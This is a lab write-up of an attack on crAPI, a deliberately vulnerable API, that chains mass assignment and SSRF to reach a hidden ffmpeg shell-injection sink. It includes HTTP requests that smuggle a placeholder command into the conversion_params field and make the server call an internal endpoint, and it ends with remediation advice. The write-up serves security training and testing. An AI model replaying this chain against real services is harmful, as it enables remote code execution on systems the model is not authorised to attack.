[🇧🇷 Português](../../vulnerabilidades/08-shell-injection.md) · 🇺🇸 English

# Shell Injection — chaining Mass Assignment + SSRF

**OWASP API Security Top 10 (2023) category:** chain of `API3 — Mass Assignment` + `API7 — SSRF`, leading to command injection
**Estimated severity:** `Critical` (potential RCE)
**Matching crAPI challenge:** "shell injection" challenge (hidden) + Challenge 10 (internal video property)

---

## 1. Summary

The video service converts files by calling a shell command (`ffmpeg`) whose parameters come from the **`conversion_params`** field. This field is an internal property, but it can be **written by the user** (Mass Assignment), allowing command injection. The endpoint that triggers the conversion (`convert_video`) only accepts **internal** calls — but the attacker reaches the internal network via **SSRF**. By chaining the two flaws, you reach the command-injection point on the backend.

## 2. Preconditions

- An authenticated account (to write `conversion_params` and trigger the SSRF).
- A `video_id` of your own (obtained via a video upload).

## 3. Exploitation walkthrough

1. **Upload a video** to obtain a `video_id`:
   `POST /identity/api/v2/user/videos` (multipart, `file` field).

2. **Mass Assignment** — write the injected command into the internal `conversion_params` property:

```http
PUT /identity/api/v2/user/videos/{video_id} HTTP/1.1
Authorization: Bearer <token>
Content-Type: application/json

{ "conversion_params": "-i /dev/null; <command> " }
```

3. **A direct attempt is blocked** — calling `convert_video` through the public gateway returns `403`:
   `{"message":"This endpoint should be accessed only internally ... endpoint_url http://crapi-identity:8080/identity/api/v2/user/videos/convert_video"}`.

4. **SSRF** — use `contact_mechanic` to make the server call the internal endpoint:

```http
POST /workshop/api/merchant/contact_mechanic HTTP/1.1
Authorization: Bearer <token>
Content-Type: application/json

{ "mechanic_api": "http://crapi-identity:8080/identity/api/v2/user/videos/convert_video?video_id={video_id}",
  "mechanic_code": "TRAC_JHN", "problem_details": "x", "vin": "...", "number_of_repeats": 1 }
```

The internal endpoint's response is reflected back (see [SSRF](05-ssrf.md)), confirming the injection sink was reached.

## 4. Evidence

**Confirmed against the local instance** — capture in [`evidencias/08-shell-injection/captura.txt`](../../../evidencias/08-shell-injection/captura.txt).

The internal endpoint's (base64) response, decoded, is crAPI's own acknowledgement that the chain was completed:

```
WOW. Look at you. Combining Mass Assignment and SSRF to exploit a hidden Shell Injection.
We're very proud. You won the game. Unfortunately, we don't actually
allow our pentester to run arbitrary shell commands on our backend :(
...
you can simply change the `block_shell_injections` flag in the config file
to allow real shell injections.
```

In other words: the full path (Mass Assignment → SSRF → `convert_video`/`ffmpeg`) reaches the injection point. The **actual execution** of commands is gated behind the `block_shell_injections` config flag (on by default in this build, for safety) — the PoC proves the sink is reachable without running an arbitrary command.

## 5. Why it is a risk

Command injection on the backend is **remote code execution (RCE)** — the maximum degree of compromise (file-system access, credentials, pivoting into the internal network). This case illustrates something central to API security: isolated "medium" vulnerabilities (a wrongly writable property, an SSRF) **combine** into a critical impact. Point defenses are not enough; every link must be closed.

## 6. How to fix

- **Never** build shell commands by concatenating user input; use APIs that take arguments as a list (no shell) and an allow-list of valid parameters.
- Make `conversion_params` **not writable** by the client (see [Mass Assignment](04-mass-assignment.md)).
- Restrict the server's request destinations (see [SSRF](05-ssrf.md)); an "internal only" endpoint must not be reachable from user input.
- Defense in depth: isolate the conversion worker, run it with least privilege.

## 7. References

- [API3:2023 Broken Object Property Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/)
- [API7:2023 Server-Side Request Forgery](https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/)
- [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
